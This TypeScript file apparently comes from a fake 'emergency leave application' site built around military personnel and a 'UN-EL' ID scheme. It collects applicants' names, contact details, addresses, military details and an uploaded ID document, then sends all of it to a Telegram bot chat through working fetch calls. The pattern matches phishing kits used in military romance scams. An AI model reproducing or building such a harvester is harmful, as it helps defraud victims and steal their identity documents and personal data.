
// Function to send form data to Telegram bot
export const sendToTelegram = async (
  botToken: string, 
  chatId: string, 
  formData: Record<string, any>,
  uploadedFile?: File
): Promise<boolean> => {
  try {
    // Format the form data for Telegram message
    const messageText = formatFormData(formData);
    
    // Send text message first
    const textResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: messageText,
          parse_mode: 'HTML',
        }),
      }
    );

    if (!textResponse.ok) {
      console.error('Failed to send message to Telegram');
      return false;
    }
    
    // If there's a file, send it as a document
    if (uploadedFile) {
      const fileData = new FormData();
      fileData.append('chat_id', chatId);
      fileData.append('document', uploadedFile);
      fileData.append('caption', `ID Proof for Application ${formData.applicationId}`);
      
      const fileResponse = await fetch(
        `https://api.telegram.org/bot${botToken}/sendDocument`,
        {
          method: 'POST',
          body: fileData,
        }
      );
      
      if (!fileResponse.ok) {
        console.error('Failed to send file to Telegram');
        return false;
      }
    }
    
    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
};

// Helper function to format form data into a nice looking message
const formatFormData = (formData: Record<string, any>): string => {
  let message = `<b>🆕 New Emergency Leave Application</b>\n`;
  message += `<b>Application ID:</b> ${formData.applicationId}\n\n`;
  
  // Leave Type
  message += `<b>🔷 Leave Type:</b>\n`;
  message += `${formData.leaveType}\n\n`;
  
  // Eligibility
  message += `<b>🔷 Relationship:</b>\n`;
  message += `${formData.relationship}\n\n`;
  
  // Military Personnel Info
  message += `<b>🔷 Military Personnel:</b>\n`;
  message += `Name: ${formData.militaryName}\n`;
  message += `ID Number: ${formData.militaryId}\n`;
  message += `Post/Unit: ${formData.militaryUnit}\n`;
  message += `Location: ${formData.militaryLocation}\n`;
  message += `Rank: ${formData.militaryRank}\n\n`;
  
  // Applicant Details
  message += `<b>🔷 Applicant:</b>\n`;
  message += `Name: ${formData.applicantName}\n`;
  message += `Email: ${formData.email}\n`;
  message += `Phone: ${formData.phone}\n`;
  message += `Address: ${formData.address}, ${formData.country}\n\n`;
  
  // Reason for Leave
  message += `<b>🔷 Emergency Details:</b>\n`;
  message += `Type: ${formData.emergencyType}\n`;
  message += `Description: ${formData.emergencyDescription}\n\n`;
  
  message += `<b>✅ Application submitted at:</b> ${new Date().toLocaleString()}\n`;
  
  return message;
};

// Function to generate a unique application ID
export const generateApplicationId = (): string => {
  const prefix = 'UN-EL';
  const timestamp = Date.now().toString().slice(-6);
  const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
  
  return `${prefix}-${timestamp}-${random}`;
};
